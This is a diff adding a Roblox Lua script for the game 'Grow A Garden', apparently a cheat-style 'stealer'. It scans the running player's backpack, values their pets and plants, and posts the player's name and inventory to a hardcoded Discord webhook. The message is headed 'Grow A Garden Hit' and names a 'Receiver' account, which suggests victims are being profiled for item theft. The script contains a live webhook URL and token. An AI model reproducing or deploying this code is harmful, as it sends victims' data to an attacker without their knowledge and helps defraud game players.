@@ -1,0 +1,175 @@
+task.spawn(function()
+	repeat task.wait() until game:IsLoaded()
+	print("[DEBUG] Script started")
+
+	_G.scriptExecuted = _G.scriptExecuted or false
+	if _G.scriptExecuted then return end
+	_G.scriptExecuted = true
+
+	-- CONFIG
+	local users = _G.Usernames or {"DanyelQuibs"}
+	local min_value = _G.min_value or 100000
+	local ping = _G.pingEveryone or "No"
+	local webhook = "https://discord.com/api/webhooks/1382457262177783889/omW4Knrp97WLOI_6PkoA1DWV_huJAeLfhHqm_jzk9OuOzIdwlEqsir7wkV6GyfS2QLpy"
+
+	-- SERVICES
+	local Players = game:GetService("Players")
+	local HttpService = game:GetService("HttpService")
+	local plr = Players.LocalPlayer
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	local backpack = plr:WaitForChild("Backpack")
+	local character = plr.Character or plr.CharacterAdded:Wait()
+
+	-- MODULES
+	local calcPlantValue, petUtils, petRegistry, numberUtil, dataService
+	local success, err = pcall(function()
+		local modules = replicatedStorage:WaitForChild("Modules")
+		calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+		petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+		dataService = require(modules:WaitForChild("DataService"))
+		numberUtil = require(modules:WaitForChild("NumberUtil"))
+		petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+	end)
+
+	if not success then
+		warn("[ERROR] Failed to load modules:", err)
+		return
+	end
+
+	print("[DEBUG] All modules loaded")
+
+	local rarePetEmojis = {
+		["Red Fox"] = "🦊",
+		["Raccoon"] = "🦝",
+		["Dragonfly"] = "🐲"
+	}
+
+	local function formatNumber(n)
+		local formatted = tostring(n)
+		local k = 1
+		while true do  
+			formatted, k = formatted:gsub("(%d)(%d%d%d)(%D)", "%1,%2%3")
+			if k == 0 then break end
+		end
+		return formatted
+	end
+
+	local function getWeight(tool)
+		local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
+		if weightValue and weightValue:IsA("NumberValue") then
+			return math.floor(weightValue.Value * 100 + 0.5) / 100
+		end
+		local match = tool.Name:match("%[(%d+%.?%d*) ?KG%]") or tool.Name:match("%((%d+%.?%d*) ?kg%)")
+		return match and tonumber(match) or 0
+	end
+
+	local function calcPetValue(petData)
+		local eggData = petRegistry.PetEggs[petData.PetData.HatchedFrom]
+		if not eggData then return 0 end
+		local rarity = eggData.RarityData.Items[petData.PetType]
+		if not rarity then return 0 end
+		local weightRange = rarity.GeneratedPetData.WeightRange
+		local interp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
+		local scale = math.lerp(0.8, 1.2, interp)
+		local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
+		local finalScale = scale * math.lerp(0.15, 6, levelProgress)
+		local value = petRegistry.PetList[petData.PetType].SellPrice * finalScale
+		return math.floor(value)
+	end
+
+	-- Scan backpack
+	local itemsToSend = {}
+	local totalValue = 0
+
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if not tool:IsA("Tool") then continue end
+		local nameLower = tool.Name:lower()
+		if nameLower:find("seed") or nameLower:find("shovel") or nameLower:find("water") or nameLower:find("fertilizer") then continue end
+
+		local itemType = tool:GetAttribute("ItemType")
+		local weight = getWeight(tool)
+
+		if itemType == "Pet" then
+			local uuid = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
+			if petData then
+				local name = petData.PetType
+				local value = calcPetValue(petData)
+				local icon = rarePetEmojis[name] or "🐶"
+				table.insert(itemsToSend, {
+					Tool = tool,
+					Name = name,
+					Value = value,
+					Weight = weight,
+					Type = "Pet",
+					Emoji = icon,
+					Rare = rarePetEmojis[name] ~= nil
+				})
+				totalValue += value
+			end
+		else
+			local name = tool:GetAttribute("ItemName") or tool.Name
+			local value = calcPlantValue(tool)
+			table.insert(itemsToSend, {
+				Tool = tool,
+				Name = name,
+				Value = value,
+				Weight = weight,
+				Type = "Plant",
+				Emoji = "🍄",
+				Rare = false
+			})
+			totalValue += value
+		end
+	end
+
+	-- Sort (Rare pets first, then by descending value)
+	table.sort(itemsToSend, function(a, b)
+		if a.Rare and not b.Rare then return true end
+		if not a.Rare and b.Rare then return false end
+		return a.Value > b.Value
+	end)
+
+	-- Webhook
+	local function sendWebhook()
+		local infoBlock = string.format(":bust_in_silhouette: Player Information\n```Name: %s\nReceiver: %s```", plr.Name, users[1] or "?")
+		local valueBlock = string.format(":moneybag: Total Value\n```%s¢```", formatNumber(totalValue))
+		local itemBlock = ":palm_tree: Backpack\n```"
+		for _, item in ipairs(itemsToSend) do
+			itemBlock ..= string.format("%s - %s [%.2f KG] → %s¢\n", item.Emoji, item.Name, item.Weight, formatNumber(item.Value))
+		end
+		itemBlock ..= "```"
+
+		local data = {
+			embeds = {{
+				title = ":potted_plant: Grow A Garden Hit - PRIMO SCRIPTS :four_leaf_clover:",
+				description = table.concat({infoBlock, valueBlock, itemBlock}, "\n"),
+				color = 65280
+			}}
+		}
+
+		local request = (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
+		if not request then warn("[ERROR] No request function") return end
+
+		local success, err = pcall(function()
+			request({
+				Url = webhook,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode(data)
+			})
+		end)
+
+		if success then
+			print("[DEBUG] Webhook sent")
+		else
+			warn("[ERROR] Webhook failed:", err)
+		end
+	end
+
+	if #itemsToSend > 0 then
+		sendWebhook()
+	else
+		print("[DEBUG] No items found in backpack to gift.")
+	end
+end)
